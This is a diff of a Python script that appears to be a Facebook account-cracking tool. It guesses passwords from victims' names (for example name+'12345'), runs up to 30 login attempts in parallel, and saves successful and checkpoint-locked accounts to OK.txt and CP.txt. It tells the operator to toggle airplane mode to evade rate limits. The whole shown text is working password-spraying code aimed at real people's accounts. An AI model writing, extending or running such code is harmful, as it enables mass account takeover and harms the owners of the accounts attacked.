@@ -267,7 +267,7 @@ def first():
 				pool.submit(crack,idf,pwv)
 def name():
 	clear()
-	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n [!] \033[1;96m~Use Flight Mode 5 Second After Every 10 mint~\033[1;0m\n- - - - - - - - - - - - - - - - - - - - - - - - - - -\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			try:
@@ -283,7 +283,12 @@ def name():
 				else:
 					pwv = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
 					pwv = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
-				pool.submit(self.__metode__, idf, pwv, "mbasic.facebook.com")
+				if 'mobile' in method:
+					pool.submit(crack,idf,pwv)
+				elif 'free' in method:
+					pool.submit(free,idf,pwv)
+				else:
+					pool.submit(crack,idf,pwv)
 			except:
 				pass
 def name2():
@@ -293,15 +298,19 @@ def name2():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			first,last = nmf.split(' ')[0],nmf.split(' ')[1]
+			firstl = first.lower()
+			lastl = last.lower()
+			firsts = first.capitalize()
+			lasts = last.capitalize()
 			if len(nmf):
-				if len(first+last)>=6:
+				if len(firstl+' '+lastl)>=6:
 					pwv = [ nmf ]
 				elif len(first)<=2:
 					pwv = [ nmf ]
-				elif len(first)<=3:
+				elif len(firsts+' '+lasts)>=6:
 					pwv = [ nmf ]
 				else:
-					pwv = [ nmf ]
+					pwv = [ nmf+'12' ]
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
